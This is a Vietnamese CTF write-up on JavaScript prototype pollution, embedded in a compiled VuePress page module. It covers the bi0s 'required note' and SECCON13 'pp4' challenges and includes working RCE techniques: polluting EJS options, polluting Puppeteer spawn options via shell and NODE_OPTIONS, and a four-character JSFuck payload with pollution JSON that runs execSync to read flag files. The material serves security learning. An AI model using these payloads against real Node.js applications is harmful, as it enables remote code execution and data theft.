8px 0;\\n      box-sizing: border-box;\\n      background-color: #333333; /* Input background color */\\n      color: #ffffff; /* Input text color */\\n      border: 1px solid #ffffff; /* Input border color */\\n    }\\n\\n    input[type=\\&quot;button\\&quot;] {\\n      background-color: #ffffff; /* Button background color */\\n      color: #303030; /* Button text color */\\n      padding: 10px 15px;\\n      border: none;\\n      cursor: pointer;\\n      width: 100%;\\n    }\\n\\n    input[type=\\&quot;button\\&quot;]:hover {\\n      background-color: #555555; /* Button background color on hover */\\n    }\\n\\n    #message {\\n      color: #ff0000; /* Error message color */\\n      margin-top: 10px;\\n      text-align: center;\\n    }\\n\\n    #noteList {\\n      list-style-type: none;\\n      padding: 0;\\n    }\\n\\n    #noteList li {\\n      margin-bottom: 8px;\\n    }\\n\\n    #noteList a {\\n      text-decoration: none;\\n      color: #ffffff; /* Link text color */\\n    }\\n\\n    #noteList a:hover {\\n      text-decoration: underline;\\n    }\\n  &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;div class=\\&quot;card\\&quot;&gt;\\n  &lt;h1&gt;Create a New Note&lt;/h1&gt;\\n  &lt;form id=\\&quot;noteForm\\&quot;&gt;\\n    &lt;label for=\\&quot;title\\&quot;&gt;Title:&lt;/label&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;text\\&quot; id=\\&quot;title\\&quot; name=\\&quot;title\\&quot; required&gt;&lt;br&gt;\\n    &lt;label for=\\&quot;content\\&quot;&gt;Content:&lt;/label&gt;&lt;br&gt;\\n    &lt;textarea id=\\&quot;content\\&quot; name=\\&quot;content\\&quot; rows=\\&quot;4\\&quot; cols=\\&quot;50\\&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;\\n    &lt;input type=\\&quot;button\\&quot; value=\\&quot;Create Note\\&quot; onclick=\\&quot;submitNote()\\&quot;&gt;\\n  &lt;/form&gt;\\n\\n&lt;div id=\\&quot;message\\&quot; style=\\&quot;color: red;\\&quot;&gt;&lt;/div&gt;\\n\\n&lt;script&gt;\\nfunction addItemToList(item) {\\n  const noteList = document.getElementById(&#39;noteList&#39;);\\n  const listItem = document.createElement(&#39;li&#39;);\\n\\n  const link = document.createElement(&#39;a&#39;);\\n  link.href = `/view/${item.Noteid}`; \\n  link.textContent = item.Noteid; \\n  listItem.appendChild(link);\\n\\n  noteList.appendChild(listItem);\\n}\\n\\nfunction submitNote() {\\n  const title = document.getElementById(\\&quot;title\\&quot;).value;\\n  const content = document.getElementById(\\&quot;content\\&quot;).value;\\n\\n  const noteData = { title, content };\\n\\n  fetch(\\&quot;/create\\&quot;, {\\n    method: \\&quot;POST\\&quot;,\\n    headers: {\\n      \\&quot;Content-Type\\&quot;: \\&quot;application/json\\&quot;,\\n    },\\n    body: JSON.stringify(noteData),\\n  })\\n    .then((response) =&gt; response.json())\\n    .then((data) =&gt; {\\n      if (data.Message) {\\n        document.getElementById(\\&quot;message\\&quot;).innerHTML = data.Message;\\n        if (data.Noteid){\\n          addItemToList(data);\\n        }\\n      } \\n    })\\n    .catch((error) =&gt; {\\n      console.error(\\&quot;error:\\&quot;, error);\\n      document.getElementById(\\&quot;message\\&quot;).innerText = &#39;Error&#39;;\\n    });\\n\\n}\\n&lt;/script&gt;\\n\\n  &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">145</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>Message<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n    &lt;p&gt;&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">146</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> Message <span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;/p&gt;\\n  &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">147</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token punctuation">}</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n  &lt;h2&gt;Created Notes:&lt;/h2&gt;\\n  &lt;ul id=\\&quot;noteList\\&quot; style=\\&quot;text-align:center\\&quot;&gt;\\n    &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">150</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> noteId <span class="token keyword">of</span> noteList<span class="token punctuation">)</span> <span class="token punctuation">{</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n      &lt;li&gt;&lt;a href=\\&quot;/view/&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">151</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> noteId <span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\&quot;&gt;&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token function">escapeFn</span><span class="token punctuation">(</span> noteId <span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;/a&gt;&lt;/li&gt;\\n    &quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">152</span></span>\n<span class="line">    <span class="token punctuation">;</span>  <span class="token punctuation">}</span> </span>\n<span class="line">    <span class="token punctuation">;</span> <span class="token function">__append</span><span class="token punctuation">(</span><span class="token string">&quot;\\n  &lt;/ul&gt;\\n  &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">;</span> __line <span class="token operator">=</span> <span class="token number">157</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token keyword">return</span> __output<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token function">rethrow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> __lines<span class="token punctuation">,</span> __filename<span class="token punctuation">,</span> __line<span class="token punctuation">,</span> escapeFn<span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>Như vậy, sau khi xem một note bất kỳ hay GET đến <code>/create</code>, hàm <code>res.render()</code> sẽ được gọi và sử dụng EJS để render template, options prototype được truyền vào sẽ execute code của mình.</p><p>Trước tiên gán cho <code>opts.client</code> là truthy value. Tiếp tục gán cho <code>escapeFunction</code>. Vì có thể RCE, mình có có thể đọc tất cả các notes và tìm note có flag, sau đó tạo note mới chỉ chứa flag đó với tên cố định (<code>flag.json</code>). Options của EJS đã được gán vào, giờ ta chỉ cần cho hàm <code>res.render()</code> chạy, file note mới với tên <code>flag.json</code> sẽ được sinh ra, view note đó và lấy flag 😙 <img src="' + _imports_10 + '" alt="alt text"></p><h5 id="rce-voi-puppeteer" tabindex="-1"><a class="header-anchor" href="#rce-voi-puppeteer"><span>RCE với Puppeteer</span></a></h5><p>Khi GET <code>/healthcheck</code>, server sẽ chạy bot với Puppeteer, tạo một process mới, chạy browser headless và truy cập vào trang <code>/view/Healthcheck</code>. <img src="' + _imports_11 + '" alt="alt text"> Khi Puppeteer launch browser mới, cũng đồng thời sử dụng <code>child_process.spawn()</code> với 3 args là <code>detached</code>, <code>env</code>, <code>stdio</code>. <img src="' + _imports_12 + '" alt="alt text"> Tuy nhiên hàm <code>spawn()</code> còn những options khác như <code>shell</code>, <code>argv0</code>, ta có thể pollute các attribute này để gọi shell chạy lệnh của mình.</p><p>Ta thử gán giá trị cho 2 options nói trên <img src="' + _imports_13 + '" alt="alt text"> Server sẽ chạy lệnh như sau <code>/bin/sh echo hehehe -c this.#executablePath this.#args</code>. Như vậy, ta có thể thay đổi <code>shell</code> thành <code>/proc/self/exe</code> -&gt; <code>node</code> và RCE với <code>NODE_OPTIONS</code></p><p>Đầu tiên gán giá trị cho <code>shell</code> thành <code>/proc/self/exe</code>, tiếp tục gán giá trị cho <code>argv0</code> là đoạn javascript cần execute. Cuối cùng là chỉnh <code>NODE_OPTIONS</code> là <code>--require /proc/self/cmdline</code> để chạy lệnh của mình. Sau khi pollute các options thì GET đến <code>/healthcheck</code> để Puppeteer spawn process mới. Khi đó, command mình đưa vào sẽ được thực hiện, giờ chỉ cần mở <code>/view/flag</code> lấy flag</p><h3 id="seccon13-pp4" tabindex="-1"><a class="header-anchor" href="#seccon13-pp4"><span>seccon13/pp4</span></a></h3><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">INFO</p><blockquote><p>Author: Ark</p></blockquote><details class="custom-container details"><summary class="custom-container-title">Source</summary><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token hashbang comment">#!/usr/local/bin/node</span></span>\n<span class="line"><span class="token keyword">const</span> readline <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;node:readline/promises&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token keyword">const</span> rl <span class="token operator">=</span> readline<span class="token punctuation">.</span><span class="token function">createInterface</span><span class="token punctuation">(</span><span class="token punctuation">{</span></span>\n<span class="line">  <span class="token literal-property property">input</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">,</span></span>\n<span class="line">  <span class="token literal-property property">output</span><span class="token operator">:</span> process<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> value <span class="token operator">==</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>key <span class="token keyword">in</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span></span>\n<span class="line">      <span class="token function">clone</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> result<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>\n<span class="line">      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token keyword">return</span> result<span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token comment">// Step 1: Prototype Pollution</span></span>\n<span class="line">  <span class="token keyword">const</span> json <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">&quot;Input JSON: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span>\n<span class="line">  <span class="token comment">// Step 2: JSF**k with 4 characters</span></span>\n<span class="line">  <span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">await</span> rl<span class="token punctuation">.</span><span class="token function">question</span><span class="token punctuation">(</span><span class="token string">&quot;Input code: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>size <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;Too many :(&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">    <span class="token keyword">return</span><span class="token punctuation">;</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line">  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">finally</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> rl<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details></div><p>Bài yêu cầu người dùng nhập vào một JSON để pollute prototype và sau đó eval code với 4 kí tự. JSFuck bình thường cần sử dụng đến 6 kí tự nên ta cần phải tìm cách pollute được prototype nào đó để có thể chạy code bất kì chỉ với 4 kí tự.</p><p>Chỉ nhập vào được 4 kí tự nên ta cần pollute code và sử dụng Object Function để chạy đoạn code đó.</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">&quot;code&quot;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line"></span></code></pre></div><p>Đoạn code trên sẽ tạo anonymous function sau đó execute function đó. Giờ ta cần chuyển qua jsfuck để có thể execute code. JSFuck thông thường có 6 kí tự <code>[]()!+</code>, tuy nhiên trong này chỉ được 4 kí tự. Nên ta cần chọn ra 4 kí tự có thể sử dụng được trong bài này. Trước hết ta cần <code>()</code> để có thể invoke function. Hai kí tự còn lại có thể tận dụng được để làm nhiều thứ khác là <code>[]</code>.</p><p><code>[]</code> là Array, các prototype của nó bao gồm những hàm thuộc object Function, như vậy ta cần tìm cách gọi đến một trong những prototype dưới đây để có được object Function <img src="' + _imports_14 + '" alt="alt text"> Sau khi có được đến Function bất kì, ta có thể truy cập đến <code>constructor</code> của nó để gọi được object Function <img src="' + _imports_15 + '" alt="alt text"></p><p>Vấn đề bây giờ là làm sao chỉ dựa vào 4 kí tự <code>[]()</code> để truy cập được <code>constructor</code>. <code>[]</code> là kí tự khá đặc biệt, không chỉ là Array mà còn là cách để truy cập một thuộc tính của object. Ta phải tìm cách pollute để có thể gọi đến string &quot;constructor&quot;. Khi sử dụng bracket notation, tên thuộc tính trước hết sẽ được chuyển qua String. Ví dụ với object <code>a</code>, khi truy cập đến một thuộc tính không tồn tại, sẽ trả về <code>undefined</code>, convert qua String sẽ thành chuỗi <code>&quot;undefined&quot;</code>. Như thế ta chỉ cần pollute <code>&quot;undefined&quot; = &quot;constructor&quot;</code><img src="' + _imports_16 + '" alt="alt text"> Khi chuyển sang jsfuck, ta có thể cho Array truy cập đến một property rỗng</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">undefined</span></span>\n<span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span>Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line"></span></code></pre></div><p>Như vậy, ta đã có được object Function. Bây giờ ta cần pollute để có thể lưu được đoạn code của mình vào. Dựa vào payload ở trên. Khi ta sử dụng <code>[][[]]</code> là đang truy cập đến một property với chuỗi rỗng, ta có thể pollute chuỗi này để chứa execute code</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;console.log(123)&quot;</span></span>\n<span class="line"></span></code></pre></div><p>Lúc này, ta cần phải chỉnh lại payload phía trên một tí để có thể ra được chuỗi <code>&quot;constructor&quot;</code> vì <code>Array[&quot;&quot;]</code> lúc này không còn là undefined. Cách sửa rất đơn giản là pollute <code>console.log(123)</code> về <code>&quot;constructor&quot;</code>.</p><div class="language-javascript" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;console.log(123)&quot;</span></span>\n<span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span><span class="token string">&quot;console.log(123)&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line"></span>\n<span class="line"><span class="token operator">&gt;</span> Array<span class="token punctuation">[</span>Array<span class="token punctuation">[</span><span class="token string">&quot;&quot;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line"></span></code></pre></div><p><img src="' + _imports_17 + '" alt="alt text"> Bây giờ chỉ cần chuyển sang Jsfuck với 4 kí tự <code>[]()</code> là xong.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token constant">INPUT_JSON</span> <span class="token operator">=</span> <span class="token punctuation">{</span></span>\n<span class="line">  <span class="token string-property property">&quot;constructor&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token string-property property">&quot;prototype&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>\n<span class="line">      <span class="token string-property property">&quot;&quot;</span><span class="token operator">:</span> <span class="token string">&quot;import(&#39;child_process&#39;).then(a=&gt;a.execSync).then(b=&gt;b(&#39;cat /flag*&#39;)).then(c=&gt;console.log(String(c)))&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">      <span class="token string-property property">&quot;import(&#39;child_process&#39;).then(a=&gt;a.execSync).then(b=&gt;b(&#39;cat /flag*&#39;)).then(c=&gt;console.log(String(c)))&quot;</span><span class="token operator">:</span> <span class="token string">&quot;constructor&quot;</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">  <span class="token punctuation">}</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"><span class="token constant">INPUT_CODE</span> <span class="token operator">=</span> <span class="token string">&quot;[][[][[][[]]]][[][[][[]]]]([][[]])()&quot;</span></span>\n<span class="line">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token constant">INPUT_JSON</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">INPUT_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>', 22))
  ]);
}
const prototypePollutionBios_html = /* @__PURE__ */ _export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "prototype-pollution-bios.html.vue"]]);
const data = JSON.parse('{"path":"/blogs/CTF/2024/prototype-pollution-bios.html","title":"Prototype Pollution","lang":"en-US","frontmatter":{"title":"Prototype Pollution","date":"2024-05-17T00:00:00.000Z","tags":["Prototype-Pollution","RCE"],"categories":["Research"]},"headers":[{"level":2,"title":"Object trong JavaScript","slug":"object-trong-javascript","link":"#object-trong-javascript","children":[{"level":3,"title":"Object Prototypes","slug":"object-prototypes","link":"#object-prototypes","children":[]},{"level":3,"title":"Protoype chain","slug":"protoype-chain","link":"#protoype-chain","children":[]}]},{"level":2,"title":"Prototype Pollution","slug":"prototype-pollution","link":"#prototype-pollution","children":[{"level":3,"title":"Sơ lược","slug":"so-luoc","link":"#so-luoc","children":[]},{"level":3,"title":"Nguyên nhân","slug":"nguyen-nhan","link":"#nguyen-nhan","children":[]}]},{"level":2,"title":"Challenge:","slug":"challenge","link":"#challenge","children":[{"level":3,"title":"bi0s/required note","slug":"bi0s-required-note","link":"#bi0s-required-note","children":[]},{"level":3,"title":"seccon13/pp4","slug":"seccon13-pp4","link":"#seccon13-pp4","children":[]}]}],"git":{"createdTime":1734340044000,"updatedTime":1734340044000,"contributors":[{"name":"Phan Nguyen Huy Duy","email":"pnhd.dyh@gmail.com","commits":1}]},"filePathRelative":"blogs/CTF/2024/prototype-pollution-bios.md"}');
export {
  prototypePollutionBios_html as comp,
  data
};
